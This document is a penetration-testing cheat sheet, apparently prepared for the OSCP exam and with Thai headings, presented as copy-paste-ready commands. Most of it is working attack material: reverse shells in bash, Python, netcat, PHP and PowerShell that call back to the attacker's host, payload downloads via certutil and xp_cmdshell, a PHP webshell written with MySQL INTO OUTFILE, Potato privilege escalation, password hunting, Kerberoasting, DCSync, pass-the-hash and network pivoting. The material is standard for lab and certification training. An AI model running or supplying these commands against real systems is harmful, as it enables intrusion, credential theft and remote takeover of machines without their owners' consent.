# 🚨 Emergency Commands

> **คำสั่งที่ใช้บ่อยที่สุด - Copy-Paste Ready**

---

## 🔧 Setup Variables First

```shell
# ตั้งค่าตัวแปรก่อนใช้งาน
export rhost="192.168.1.100"    # Target IP
export lhost="10.10.14.5"       # Your IP  
export lport="4444"             # Listener port
export domain="corp.local"      # AD domain
```

---

## 🎯 Reverse Shell

### Listener (Your Machine)

```shell
# Basic
nc -lvnp $lport

# Better (with readline)
rlwrap nc -lvnp $lport

# Metasploit
msfconsole -q -x "use exploit/multi/handler; set PAYLOAD linux/x64/shell_reverse_tcp; set LHOST $lhost; set LPORT $lport; exploit"
```

### Linux Shells

```shell
# Bash
bash -i >& /dev/tcp/$lhost/$lport 0>&1

# Bash (URL encoded for web)
bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F$lhost%2F$lport%200%3E%261%27

# Python
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("'$lhost'",'$lport'));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])'

# Netcat
nc -e /bin/bash $lhost $lport
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc $lhost $lport >/tmp/f

# PHP
php -r '$sock=fsockopen("'$lhost'",'$lport');exec("/bin/bash -i <&3 >&3 2>&3");'
```

### Windows Shells

```powershell
# PowerShell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('$lhost',$lport);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"

# PowerShell (Base64) - Generate with:
# echo -n 'IEX(...)' | iconv -t utf-16le | base64 -w 0
powershell -ep bypass -enc <BASE64>
```

---

## 📁 File Transfer

### To Linux Target

```shell
# wget
wget http://$lhost/file -O /tmp/file

# curl
curl http://$lhost/file -o /tmp/file

# Bash only (no wget/curl)
cat < /dev/tcp/$lhost/80 > file
```

### To Windows Target

```cmd
:: certutil
certutil -urlcache -split -f http://%lhost%/file C:\Windows\Temp\file

:: PowerShell
powershell -c "iwr http://$lhost/file -o C:\Windows\Temp\file"
powershell -c "(New-Object Net.WebClient).DownloadFile('http://$lhost/file','C:\Windows\Temp\file')"
```

### Host File Server

```shell
# Python HTTP server
python3 -m http.server 80

# SMB server (for Windows)
impacket-smbserver share . -smb2support

# From Windows access
copy \\$lhost\share\file C:\Windows\Temp\
```

---

## 🔄 Shell Upgrade (TTY)

```shell
# Step 1: Spawn PTY
python3 -c 'import pty;pty.spawn("/bin/bash")'

# Step 2: Background shell
# Press Ctrl+Z

# Step 3: Configure terminal
stty raw -echo; fg

# Step 4: Set terminal type
export TERM=xterm-256color
export SHELL=bash
stty rows 50 cols 200
```

---

## 🔍 Quick Enumeration

### Linux

```shell
# Full enum
id && uname -a && cat /etc/passwd && sudo -l 2>/dev/null

# SUID binaries
find / -perm -4000 -type f 2>/dev/null

# Writable files
find / -writable -type f 2>/dev/null | grep -v proc

# Passwords
grep -rniE 'password|passwd|pwd' /etc /home /var 2>/dev/null | head -20
```

### Windows

```cmd
:: Full enum
whoami /all && systeminfo && net user && net localgroup administrators

:: Check privileges for Potato
whoami /priv | findstr /i "SeImpersonate SeAssignPrimary"

:: Passwords in registry
reg query HKLM /f password /t REG_SZ /s 2>nul | findstr /i password
```

---

## 🥔 Potato Exploits (SeImpersonatePrivilege)

```shell
# Check if vulnerable
whoami /priv | findstr SeImpersonate

# GodPotato (Windows 2019+)
.\GodPotato.exe -cmd "C:\Windows\Temp\nc.exe -e cmd $lhost $lport"

# SigmaPotato (Universal)  
.\SigmaPotato.exe "C:\Windows\Temp\nc.exe -e cmd $lhost $lport"

# PrintSpoofer
.\PrintSpoofer64.exe -c "C:\Windows\Temp\nc.exe -e cmd $lhost $lport"
```

---

## 🔐 Hash Cracking

```shell
# Identify hash
hashcat --identify hash.txt
hash-identifier

# Common modes
hashcat -m 0 hash.txt wordlist.txt     # MD5
hashcat -m 1000 hash.txt wordlist.txt  # NTLM
hashcat -m 1800 hash.txt wordlist.txt  # SHA512crypt
hashcat -m 13100 hash.txt wordlist.txt # Kerberoast
hashcat -m 18200 hash.txt wordlist.txt # ASREPRoast

# With rules
hashcat -m 1000 hash.txt wordlist.txt -r /usr/share/hashcat/rules/best64.rule
```

---

## 🗄️ Database Quick Commands

### MSSQL

```shell
# Connect
impacket-mssqlclient $user:$pass@$rhost -windows-auth

# Enable xp_cmdshell
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;

# Execute commands
EXEC xp_cmdshell 'whoami';
EXEC xp_cmdshell 'powershell -c "iwr http://$lhost/nc.exe -o C:\Temp\nc.exe"';
```

### MySQL

```shell
# Connect
mysql -h $rhost -u $user -p$pass

# Read files (if FILE privilege)
SELECT LOAD_FILE('/etc/passwd');

# Write webshell (if INTO OUTFILE)
SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell.php';
```

---

## 🎫 AD Quick Commands

```shell
# User enumeration
nxc smb $rhost -u '' -p '' --users
impacket-lookupsid $domain/''@$rhost

# Kerberoast
impacket-GetUserSPNs -dc-ip $rhost $domain/$user:$pass -request

# ASREPRoast
impacket-GetNPUsers -dc-ip $rhost $domain/ -usersfile users.txt -format hashcat

# DCSync
impacket-secretsdump $domain/$user:$pass@$rhost

# Pass-the-Hash
evil-winrm -i $rhost -u Administrator -H <NTLM_HASH>
impacket-psexec -hashes :<NTLM_HASH> Administrator@$rhost
```

---

## 🌐 Pivoting Quick Start

### Ligolo-ng

```shell
# Attacker (proxy)
sudo ip tuntap add user $(whoami) mode tun ligolo
sudo ip link set ligolo up
./proxy -selfcert -laddr 0.0.0.0:11601

# Target (agent)
./agent -connect $lhost:11601 -ignore-cert

# In Ligolo console
session                          # Select session
ifconfig                         # Show target networks
start                            # Start tunnel (with autoroute)

# Add route manually if needed (attacker)
sudo ip route add 10.10.10.0/24 dev ligolo
```

### Chisel

```shell
# Attacker (server)
./chisel server -p 8888 --reverse

# Target (client) - SOCKS proxy
./chisel client $lhost:8888 R:socks

# Use with proxychains
proxychains nmap -sT -Pn $internal_host
```

---

## 📸 Screenshot Proof (OSCP)

```shell
# Linux proof
hostname && whoami && cat /root/proof.txt && ip a

# Windows proof
hostname && whoami && type C:\Users\Administrator\Desktop\proof.txt && ipconfig
```

---

## 🔗 Quick Links

| Topic | File |
|-------|------|
| Full Port Reference | [1.Scanning/](../1.Scanning/) |
| Web Attacks | [7.Web-Exploit/](../7.Web-Exploit/) |
| AD Attacks | [3.AD-Exploit/](../3.AD-Exploit/) |
| Windows PrivEsc | [4.Privilege-Escalation/4.1.Privilege-Escalation-Windows.md](../4.Privilege-Escalation/4.1.Privilege-Escalation-Windows.md) |
| Linux PrivEsc | [4.Privilege-Escalation/4.2.Privilege-Escalation-Linux.md](../4.Privilege-Escalation/4.2.Privilege-Escalation-Linux.md) |
| Ligolo-ng | [5.Lateral-Movement/5.3.Ligolo-ng-Complete-Guide.md](../5.Lateral-Movement/5.3.Ligolo-ng-Complete-Guide.md) |
| OSCP Guide | [9.OSCP-Exam/9.1.OSCP-Exam-Guide.md](../9.OSCP-Exam/9.1.OSCP-Exam-Guide.md) |
